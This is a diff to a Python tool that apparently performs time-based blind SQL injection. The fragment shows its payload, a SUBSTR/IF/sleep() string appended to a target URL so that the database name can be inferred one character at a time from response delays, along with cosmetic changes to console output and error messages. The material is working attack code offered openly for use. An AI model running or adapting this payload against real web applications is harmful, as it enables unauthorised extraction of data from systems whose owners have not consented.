@@ -52,7 +52,7 @@ def check_db():
     
     for pointer in range(1, db_length+1):
         for char in chars:
-            query = "' AND (SELECT IF(substr(database(),%s,1) like '%s',sleep(%s),null))#" % (pointer, char, args.time)
+            query = "' AND (SELECT IF(SUBSTR(database(),%s,1) like '%s',sleep(%s),null))#" % (pointer, char, args.time)
             url = args.url + quote_plus(query)
             request = requests.get(url)
             time = request.elapsed.total_seconds()
@@ -96,8 +96,9 @@ def main():
  / _  / / / _ \/ _  /\ \/ /_/ / / /___/ /  
 /____/_/_/_//_/\_,_/___/\___\_\/____/___/  
 """)
-    print("[>] Url: " + f"{COLOR['YELLOW']}{args.url}{COLOR['ENDC']}\n")
-    
+    print("[>] Url: " + f"{COLOR['YELLOW']}{args.url}{COLOR['ENDC']}")
+    print("[>] Sleep Time: " + f"{COLOR['YELLOW']}{args.time} seconds{COLOR['ENDC']}\n")
+
     try:
         print("[+] Checking the url...")
         if check_url():
@@ -111,7 +112,7 @@ def main():
     except KeyboardInterrupt:
             print("[!] Keyboard interrupt detected! Exiting program...")
     except Exception as e:
-        print(e)
+        print(f"{COLOR['RED']}[!] Exception: {e}{COLOR['ENDC']}")
         # print(f"{COLOR['RED']}[!] Unable to do SQL Injection.{COLOR['ENDC']}")
         sys.exit(1)
     
